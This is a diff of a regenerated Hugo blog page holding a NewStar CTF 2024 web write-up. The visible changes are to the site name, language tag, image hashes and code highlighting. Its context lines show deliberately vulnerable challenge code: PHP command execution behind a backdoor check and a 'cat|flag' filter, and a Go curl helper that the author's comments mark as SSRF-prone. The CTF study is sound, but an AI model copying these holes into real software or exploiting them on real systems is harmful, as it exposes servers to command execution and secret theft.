@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" week1 PangBai 过家家（1） 考点：通过token跳转页面，PATCH传参（需要注意传参方法,Content-Type） 第一关，说头部有东西\n抓包发现请求头没东西，发包看看响应头，有一个路由\n访问进入第二关，这个提示应该是要我们get传个参\n刚刚get传了，这里显然就是post传参\n">
 <title>2024newstar-web</title>
@@ -9,7 +9,7 @@
 <link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2024newstar-web">
 <meta property='og:description' content=" week1 PangBai 过家家（1） 考点：通过token跳转页面，PATCH传参（需要注意传参方法,Content-Type） 第一关，说头部有东西\n抓包发现请求头没东西，发包看看响应头，有一个路由\n访问进入第二关，这个提示应该是要我们get传个参\n刚刚get传了，这里显然就是post传参\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2024newstar-web/'>
-<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:site_name' content='zhizuijimi'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-06-03T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-06-03T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2024newstar-web">
 <meta name="twitter:description" content=" week1 PangBai 过家家（1） 考点：通过token跳转页面，PATCH传参（需要注意传参方法,Content-Type） 第一关，说头部有东西\n抓包发现请求头没东西，发包看看响应头，有一个路由\n访问进入第二关，这个提示应该是要我们get传个参\n刚刚get传了，这里显然就是post传参\n">
@@ -58,7 +58,7 @@
                     
                     
                         
-                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -71,7 +71,7 @@
         
         
         <div class="site-meta">
-            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
             <h2 class="site-description"></h2>
         </div>
     </header><ol class="menu-social">
@@ -644,7 +644,7 @@
 </div><p><img src="/p/2024newstar-web/image-20250518125230822.png"
 	width="1504"
 	height="379"
-	srcset="/p/2024newstar-web/image-20250518125230822_hu_f764febed680547d.png 480w, /p/2024newstar-web/image-20250518125230822_hu_ac81cefa079951f8.png 1024w"
+	srcset="/p/2024newstar-web/image-20250518125230822_hu_c85cff9ddfddee06.png 480w, /p/2024newstar-web/image-20250518125230822_hu_311f65bc8de561b3.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250518125230822"
@@ -670,7 +670,7 @@
 <p><img src="/p/2024newstar-web/image-20250518142524144.png"
 	width="1666"
 	height="456"
-	srcset="/p/2024newstar-web/image-20250518142524144_hu_764449f0af250a9b.png 480w, /p/2024newstar-web/image-20250518142524144_hu_29bc27fa2730cdfe.png 1024w"
+	srcset="/p/2024newstar-web/image-20250518142524144_hu_e86a140147733eee.png 480w, /p/2024newstar-web/image-20250518142524144_hu_3472429f713e4690.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250518142524144"
@@ -698,7 +698,7 @@
 </div><p><img src="/p/2024newstar-web/image-20250518143705389.png"
 	width="487"
 	height="161"
-	srcset="/p/2024newstar-web/image-20250518143705389_hu_f8ceb6d34fe54ca4.png 480w, /p/2024newstar-web/image-20250518143705389_hu_614007164e3c06d.png 1024w"
+	srcset="/p/2024newstar-web/image-20250518143705389_hu_704927ccc85ca01.png 480w, /p/2024newstar-web/image-20250518143705389_hu_a3e7fb1b169ca510.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250518143705389"
@@ -775,10 +775,10 @@
 </span></span><span class="line"><span class="cl">    <span class="nv">$hashed_reversed_cmd</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$reversed_cmd</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$hashed_reversed_cmd</span> <span class="o">!==</span> <span class="nv">$decoded_key</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Invalid key&#34;</span><span class="p">);</span>	<span class="c1">#base64解码后的key要=逆序后md5加密的cmd
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$decrypted_cmd</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$decrypted_cmd</span><span class="p">;</span><span class="c1">#base64解码cmd
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">execute_cmd</span><span class="p">(</span><span class="nx">decrypt_request</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">],</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]));</span>
@@ -902,7 +902,7 @@
 </div><p><img src="/p/2024newstar-web/image-20250518163105934.png"
 	width="1366"
 	height="325"
-	srcset="/p/2024newstar-web/image-20250518163105934_hu_8c3000d36640fc63.png 480w, /p/2024newstar-web/image-20250518163105934_hu_9ccc95b47313f628.png 1024w"
+	srcset="/p/2024newstar-web/image-20250518163105934_hu_2debcb66920d3cef.png 480w, /p/2024newstar-web/image-20250518163105934_hu_36e88c90b06325f0.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250518163105934"
@@ -948,7 +948,7 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># Functions to handle HTML output
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">print_msg</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\s*&lt;script.*&lt;\/script&gt;/s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
@@ -964,7 +964,7 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># Backdoor
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;papa&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;doKcdnEOANVB&#39;</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">show_backdoor</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;NewStar_CTF.2024&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;Welcome&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^Welcome$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;NewStar_CTF.2024&#39;</span><span class="p">]))</span> <span class="p">{</span>
@@ -1246,10 +1246,10 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="c1">//for fun
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;new&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;star&#39;</span><span class="p">])){</span>
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;new&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;star&#39;</span><span class="p">])){</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;new&#39;</span><span class="p">])</span><span class="o">===</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;star&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;new&#39;</span><span class="p">]</span><span class="o">!==</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;star&#39;</span><span class="p">]){</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//欸 为啥sha1和md5相等呢
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/cat|flag/i&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;u can not do this &#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
@@ -1309,7 +1309,7 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">//兄弟你知道了吗？
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;iknow&#39;</span><span class="p">])){</span>
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;iknow&#39;</span><span class="p">])){</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Refresh: 5;url=https://cn.bing.com/search?q=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
@@ -1582,7 +1582,7 @@
 </div><p><img src="/p/2024newstar-web/image-20250521100748612.png"
 	width="495"
 	height="118"
-	srcset="/p/2024newstar-web/image-20250521100748612_hu_6c4f06da1909b17d.png 480w, /p/2024newstar-web/image-20250521100748612_hu_17979aab2cd7afb5.png 1024w"
+	srcset="/p/2024newstar-web/image-20250521100748612_hu_a2f805100938dcd.png 480w, /p/2024newstar-web/image-20250521100748612_hu_ff315514b6b037f2.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250521100748612"
@@ -2242,7 +2242,7 @@
 <p><img src="/p/2024newstar-web/image-20250528142833952.png"
 	width="1485"
 	height="519"
-	srcset="/p/2024newstar-web/image-20250528142833952_hu_73c7af2d7d50c0ed.png 480w, /p/2024newstar-web/image-20250528142833952_hu_9da5ed088f3edbb4.png 1024w"
+	srcset="/p/2024newstar-web/image-20250528142833952_hu_39e3b4e2b7a38d98.png 480w, /p/2024newstar-web/image-20250528142833952_hu_d02c847ddb0009ee.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250528142833952"
@@ -2268,7 +2268,7 @@
 </div><p><img src="/p/2024newstar-web/image-20250528144130398.png"
 	width="1349"
 	height="322"
-	srcset="/p/2024newstar-web/image-20250528144130398_hu_ef5047be5bc0b41b.png 480w, /p/2024newstar-web/image-20250528144130398_hu_a20ceb50108972fc.png 1024w"
+	srcset="/p/2024newstar-web/image-20250528144130398_hu_e403c65bc15bbc8.png 480w, /p/2024newstar-web/image-20250528144130398_hu_4b5a201f010ed5c0.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250528144130398"
@@ -2368,7 +2368,7 @@
 <p><img src="/p/2024newstar-web/caicaibei_2.DF8ath1m.png"
 	width="813"
 	height="265"
-	srcset="/p/2024newstar-web/caicaibei_2.DF8ath1m_hu_404dd8ebe3720185.png 480w, /p/2024newstar-web/caicaibei_2.DF8ath1m_hu_a443a3a38f92d75c.png 1024w"
+	srcset="/p/2024newstar-web/caicaibei_2.DF8ath1m_hu_7fbdeb3081de8698.png 480w, /p/2024newstar-web/caicaibei_2.DF8ath1m_hu_c844b7f5e6a4f43.png 1024w"
 	loading="lazy"
 	
 	
@@ -2593,7 +2593,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nx">main</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="p">(</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;fmt&#34;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;github.com/gorilla/mux&#34;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;io/ioutil&#34;</span><span class="w">
@@ -2601,33 +2601,33 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;os/exec&#34;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;strings&#34;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;text/template&#34;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">type</span><span class="w"> </span><span class="nx">Token</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">type</span><span class="w"> </span><span class="nx">Token</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">Stringer</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">Name</span><span class="w"> </span><span class="kt">string</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="c1">// Token结构体用于存储用户信息，包含用户名</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="c1">// Token结构体用于存储用户信息，包含用户名</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">type</span><span class="w"> </span><span class="nx">Config</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">type</span><span class="w"> </span><span class="nx">Config</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">Stringer</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">Name</span><span class="w">          </span><span class="kt">string</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">JwtKey</span><span class="w">        </span><span class="kt">string</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">SignaturePath</span><span class="w"> </span><span class="kt">string</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="c1">// Config结构体存储全局配置，包含JWT密钥和签名文件路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="c1">// Config结构体存储全局配置，包含JWT密钥和签名文件路径</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">type</span><span class="w"> </span><span class="nx">Helper</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">type</span><span class="w"> </span><span class="nx">Helper</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">Stringer</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">User</span><span class="w">   </span><span class="kt">string</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">Config</span><span class="w"> </span><span class="nx">Config</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="c1">// Helper结构体用于模板渲染，包含用户信息和配置信息，可能泄露敏感数据</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="c1">// Helper结构体用于模板渲染，包含用户信息和配置信息，可能泄露敏感数据</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">var</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">Config</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">var</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">Config</span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">Name</span><span class="p">:</span><span class="w">          </span><span class="s">&#34;PangBai 过家家 (4)&#34;</span><span class="p">,</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">JwtKey</span><span class="p">:</span><span class="w">        </span><span class="nf">RandString</span><span class="p">(</span><span class="mi">64</span><span class="p">),</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">SignaturePath</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;./sign.txt&#34;</span><span class="p">,</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="c1">// 全局配置变量，包含随机生成的JWT密钥</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="c1">// 全局配置变量，包含随机生成的JWT密钥</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="nx">Helper</span><span class="p">)</span><span class="w"> </span><span class="nf">Curl</span><span class="p">(</span><span class="nx">url</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="nx">Helper</span><span class="p">)</span><span class="w"> </span><span class="nf">Curl</span><span class="p">(</span><span class="nx">url</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Curl:&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">cmd</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;curl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;-fsSL&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;--&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">cmd</span><span class="p">.</span><span class="nf">CombinedOutput</span><span class="p">()</span><span class="w">
@@ -2638,13 +2638,13 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">        
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="s">&#34;ok&#34;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="c1">// 执行curl命令，可用于SSRF攻击，可以访问内部服务，如localhost:8000/favorite</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="c1">// 执行curl命令，可用于SSRF攻击，可以访问内部服务，如localhost:8000/favorite</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">routeIndex</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="nf">routeIndex</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">http</span><span class="p">.</span><span class="nf">ServeFile</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;views/index.html&#34;</span><span class="p">)</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="c1">// 处理主页请求，直接返回index.html文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="c1">// 处理主页请求，直接返回index.html文件</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">routeEye</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="nf">routeEye</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">input</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">Query</span><span class="p">().</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;input&#34;</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">input</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">input</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&#34;{{ .User }}&#34;</span><span class="w">
@@ -2692,9 +2692,9 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;[error]&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w"> </span><span class="c1">// 渲染模板，传入Helper结构体，包含敏感信息如JWT密钥和配置信息</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">routeFavorite</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="nf">routeFavorite</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">Method</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">MethodPut</span><span class="w"> </span><span class="p">{</span><span class="w">	</span><span class="cp">//限制只有PUT请求</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">requestIP</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">RemoteAddr</span><span class="p">[:</span><span class="nx">strings</span><span class="p">.</span><span class="nf">LastIndex</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">RemoteAddr</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;:&#34;</span><span class="p">)]</span><span class="w">
